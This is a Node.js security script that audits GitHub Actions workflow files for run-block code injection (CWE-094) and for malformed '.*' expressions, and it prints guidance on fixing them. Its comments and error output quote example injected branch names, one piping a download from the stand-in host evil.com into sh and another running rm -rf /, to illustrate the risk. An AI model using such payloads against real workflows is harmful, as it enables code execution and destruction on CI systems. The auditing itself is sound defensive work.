#!/usr/bin/env node
/**
 * BI-860603DA / BI-5940955C — Actions code-injection auditor.
 *
 * Two complementary checks across every workflow under .github/workflows/:
 *
 * 1. Run-block injection (CWE-094, the GitHub-Security-flagged pattern).
 *    `${{ github.event.* }}` or `${{ inputs.* }}` expressions interpolated
 *    directly into `run:` shell blocks. A branch name like
 *    `'; curl evil.com | sh; #` becomes shell code when the runtime
 *    substitutes it.
 *
 * 2. Malformed expression syntax. A literal `${{ github.event.* }}` in any
 *    expression-evaluated field (step name, job name, with:, if:,
 *    concurrency.group, env:) crashes the workflow at startup — the `.*`
 *    wildcard token isn't valid expression syntax. Runs report
 *    `conclusion: failure` with 0 jobs. This is the bug PR #944 hotfixed;
 *    the original auditor missed it because it only scanned run: blocks.
 *    Added in the PR that extends the auditor (Task 9).
 *
 * The safe pattern is to pass `github.event.*` values through an `env:`
 * block and reference them as shell variables, which the runtime then
 * quotes correctly:
 *
 *     env:
 *       HEAD_REF: ${{ github.event.pull_request.head.ref }}
 *     run: |
 *       git push origin "HEAD:${HEAD_REF}"
 *
 * Why this auditor exists alongside CodeQL
 * ----------------------------------------
 * CodeQL already detects this (default-setup `actions/code-injection/*`).
 * This auditor adds:
 *   - Speed:        runs in seconds on PR open, doesn't wait for CodeQL.
 *   - Independence: catches the pattern even if CodeQL is misconfigured
 *                   or its actions queries are disabled.
 *   - Visibility:   the workflow name "Actions Injection Audit" makes the
 *                   invariant legible to future engineers.
 *
 * Baseline
 * --------
 * Existing accepted occurrences are listed in
 * docs/security/actions-injection-baseline.json. They are tracked for
 * burn-down via BI-5940955C. New occurrences (not in the baseline) fail.
 *
 * Run locally:
 *   node scripts/security/check-actions-injection.mjs
 *
 * Exit codes:
 *   0  No new violations.
 *   1  New violations introduced.
 *   2  Configuration error.
 */

import { readFile, readdir } from "node:fs/promises";
import { join, relative, sep } from "node:path";

const WORKFLOWS_DIR = ".github/workflows";
const BASELINE_PATH = process.env.BASELINE_PATH ?? "docs/security/actions-injection-baseline.json";

// Match `${{ github.event.* }}` and `${{ inputs.* }}` — both are
// attacker-influenced in pull_request_target / workflow_dispatch contexts.
const DANGEROUS_EXPR = /\$\{\{\s*(github\.event\.|inputs\.)/;

// Match malformed GitHub Actions expressions — the `.*` wildcard token is
// NOT valid expression syntax. A literal `${{ github.event.* }}` in any
// expression-evaluated field (step name, job name, with: parameter, if:,
// concurrency.group, etc.) crashes the workflow at startup with 0 jobs run.
// This is the bug PR #944 hotfixed. We catch it anywhere in any workflow
// (excluding YAML comments).
//
// The regex looks for `.*` (or `.<identifier>.*`) INSIDE a `${{ ... }}`
// block. Legitimate trailing access like `inputs.mode || 'release'` does
// not match — only the wildcard `.*` form does.
const MALFORMED_EXPR = /\$\{\{[^}]*\.\*[^}]*\}\}/;

/**
 * Find `${{ github.event.* }}` (or `inputs.*`) occurrences that appear
 * inside a `run:` block of a workflow. Single-line `run: foo ${{ ... }}`
 * counts. Multi-line `run: |` blocks count for any indented line.
 *
 * We deliberately ignore other contexts (`if:`, `with:` for non-script
 * actions, `env:` blocks) because the GitHub Actions runtime quotes those
 * as values, not shell input. The `with:` context for `actions/github-script`
 * IS dangerous, but encoding that exception accurately requires a real
 * YAML parser — left for a follow-up.
 */
function findViolations(content) {
  const lines = content.split(/\r?\n/);
  const violations = [];
  let inMultilineRun = false;
  let runIndent = 0;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim() === "") continue;
    // Indent for block-scope tracking = position of first non-whitespace
    // character, whether it's `-` (array item) or a key like `run`.
    const indent = line.search(/\S/);

    // Exit multiline run block when indentation drops to or below run: level.
    if (inMultilineRun && indent <= runIndent) {
      inMultilineRun = false;
    }

    // Detect entry into a multiline run block. Both `run: |` and `- run: |`
    // are supported (array-item-as-step vs. key-in-step). YAML accepts `|`,
    // `|+`, `|-`, `>`, `>-`, `>+` as block scalar indicators.
    const multilineRunStart = line.match(/^\s*-?\s*run:\s*[|>][+-]?\s*$/);
    if (multilineRunStart) {
      inMultilineRun = true;
      runIndent = indent;
      continue;
    }

    // Detect single-line run: command form. Both `run: cmd` and `- run: cmd`.
    const singleLineRun = line.match(/^\s*-?\s*run:\s+(.+?)\s*$/);
    if (singleLineRun && !singleLineRun[1].startsWith("|") && !singleLineRun[1].startsWith(">")) {
      if (DANGEROUS_EXPR.test(singleLineRun[1])) {
        violations.push({
          line: i + 1,
          snippet: singleLineRun[1].slice(0, 200),
          context: "single-line run",
        });
      }
      continue;
    }

    if (inMultilineRun && DANGEROUS_EXPR.test(line)) {
      violations.push({
        line: i + 1,
        snippet: line.trim().slice(0, 200),
        context: "multi-line run",
      });
    }
  }

  return violations;
}

/**
 * Find malformed GitHub Actions expressions that crash the workflow at
 * startup. The `.*` token is not valid expression syntax — when GH tries
 * to evaluate it (in any field that accepts expressions: step name, job
 * name, with: parameters, if: conditions, concurrency.group, etc.), the
 * workflow fails to start and reports `conclusion: failure` with zero
 * jobs run. This is the exact bug PR #944 hotfixed.
 *
 * We scan every line outside YAML comments. YAML comments (lines starting
 * with `#` after optional whitespace) are safe: they're stripped before
 * expression evaluation.
 *
 * A run-block line that contains `${{ github.event.* }}` IS shell-evaluated
 * at runtime, but it ALSO fails template eval at startup — so this check
 * is complementary to findViolations(), not duplicative. Both would catch
 * the same line, which is fine: the message tells the user which class.
 */
function findMalformedExpressions(content) {
  const lines = content.split(/\r?\n/);
  const out = [];

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (!MALFORMED_EXPR.test(line)) continue;
    // Skip YAML comments — comments aren't expression-evaluated.
    if (/^\s*#/.test(line)) continue;
    out.push({
      line: i + 1,
      snippet: line.trim().slice(0, 200),
      context: "malformed expression (.* token)",
    });
  }

  return out;
}

async function listWorkflowFiles(dir) {
  const entries = await readdir(dir, { withFileTypes: true });
  const out = [];
  for (const ent of entries) {
    if (ent.isFile() && (ent.name.endsWith(".yml") || ent.name.endsWith(".yaml"))) {
      out.push(join(dir, ent.name));
    }
  }
  return out.sort();
}

function normalizeRelativePath(p) {
  // Force forward slashes for cross-platform baseline comparison.
  return relative(process.cwd(), p).split(sep).join("/");
}

let baseline;
try {
  baseline = JSON.parse(await readFile(BASELINE_PATH, "utf8"));
} catch (err) {
  if (err.code === "ENOENT") {
    console.error(`ERROR: Baseline not found at ${BASELINE_PATH}.`);
    console.error("If this is intentional (no accepted occurrences), create a baseline file with:");
    console.error('  {"description": "...", "occurrences": []}');
    process.exit(2);
  }
  console.error(`ERROR: Could not read baseline: ${err.message}`);
  process.exit(2);
}

if (!Array.isArray(baseline.occurrences)) {
  console.error("ERROR: Baseline must have an 'occurrences' array.");
  process.exit(2);
}

// Build a Set of "file:line" pairs that are accepted.
const accepted = new Set(baseline.occurrences.map((o) => `${o.file}:${o.line}`));

let workflowFiles;
try {
  workflowFiles = await listWorkflowFiles(WORKFLOWS_DIR);
} catch (err) {
  console.error(`ERROR: Could not list ${WORKFLOWS_DIR}: ${err.message}`);
  process.exit(2);
}

const allViolations = [];
for (const file of workflowFiles) {
  const rel = normalizeRelativePath(file);
  const content = await readFile(file, "utf8");
  for (const v of findViolations(content)) {
    allViolations.push({ file: rel, ...v });
  }
  for (const v of findMalformedExpressions(content)) {
    allViolations.push({ file: rel, ...v });
  }
}

const introduced = allViolations.filter((v) => !accepted.has(`${v.file}:${v.line}`));
const baselineNotFound = baseline.occurrences.filter(
  (o) => !allViolations.some((v) => v.file === o.file && v.line === o.line),
);

console.log(`Workflows scanned: ${workflowFiles.length}`);
console.log(`Baseline accepts:  ${baseline.occurrences.length} occurrence(s)`);
console.log(`Currently found:   ${allViolations.length} occurrence(s)`);
console.log("");

if (baselineNotFound.length > 0) {
  console.log(`ℹ ${baselineNotFound.length} baseline occurrence(s) no longer present in the code:`);
  for (const o of baselineNotFound) {
    console.log(`   ${o.file}:${o.line}  (was: ${o.snippet ?? "?"})`);
    if (o.trackedBy) console.log(`   tracked by: ${o.trackedBy}`);
  }
  console.log("   Consider regenerating the baseline.");
  console.log("");
}

if (introduced.length === 0) {
  console.log("✓ Actions injection audit PASSED — no new run-block injection or malformed expressions.");
  process.exit(0);
}

// Partition violations by class so the report shows the right fix guidance
// for each. Some PRs may introduce both classes at once.
const runBlockViolations = introduced.filter((v) => v.context !== "malformed expression (.* token)");
const malformedViolations = introduced.filter((v) => v.context === "malformed expression (.* token)");

console.error(`✗ Actions injection audit FAILED — ${introduced.length} new violation(s):`);
console.error("");
for (const v of introduced) {
  console.error(`  ${v.file}:${v.line}  (${v.context})`);
  console.error(`     ${v.snippet}`);
  console.error("");
}

if (runBlockViolations.length > 0) {
  console.error("Run-block injection (CWE-094)");
  console.error("-----------------------------");
  console.error("Interpolating `${{ github.event.* }}` into a `run:` block lets the");
  console.error("GitHub Actions runtime substitute attacker-controlled values directly");
  console.error("into the shell command — a branch name like `'; rm -rf /; #` becomes");
  console.error("shell code. This is GitHub Security alert `actions/code-injection/critical`");
  console.error("and is what enabled BI-5940955C.");
  console.error("");
  console.error("Fix: pass the value through an `env:` block and reference the env var in shell:");
  console.error("");
  console.error("    env:");
  console.error("      HEAD_REF: ${{ github.event.pull_request.head.ref }}");
  console.error("    run: |");
  console.error('      git push origin "HEAD:${HEAD_REF}"');
  console.error("");
  console.error("The runtime quotes env values correctly. The shell sees a normal");
  console.error("variable, not interpolated code.");
  console.error("");
  console.error("Reference: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable");
  console.error("");
}

if (malformedViolations.length > 0) {
  console.error("Malformed expression — workflow startup failure");
  console.error("-----------------------------------------------");
  console.error("`${{ github.event.* }}` is NOT valid GitHub Actions expression syntax —");
  console.error("the `.*` wildcard token doesn't exist in their expression DSL. When GH");
  console.error("tries to evaluate it (which happens in ANY expression-evaluated field:");
  console.error("step name, job name, with: parameter, if:, concurrency.group, env:),");
  console.error("the workflow fails to start. You'll see `conclusion: failure` with 0 jobs.");
  console.error("");
  console.error("This is the exact bug PR #944 hotfixed. The auditor missed it then");
  console.error("because it only scanned run: blocks; this check covers all fields.");
  console.error("");
  console.error("Fix: replace the wildcard with a concrete property, or move the literal");
  console.error("string out of an expression-evaluated context.");
  console.error("");
  console.error("    # Broken (literal `.*` in name field):");
  console.error("    - name: Scan for `${{ github.event.* }}` in run blocks");
  console.error("");
  console.error("    # Fixed (describe without embedding the malformed expression):");
  console.error("    - name: Scan for dangerous expressions in run blocks");
  console.error("");
}

process.exit(1);
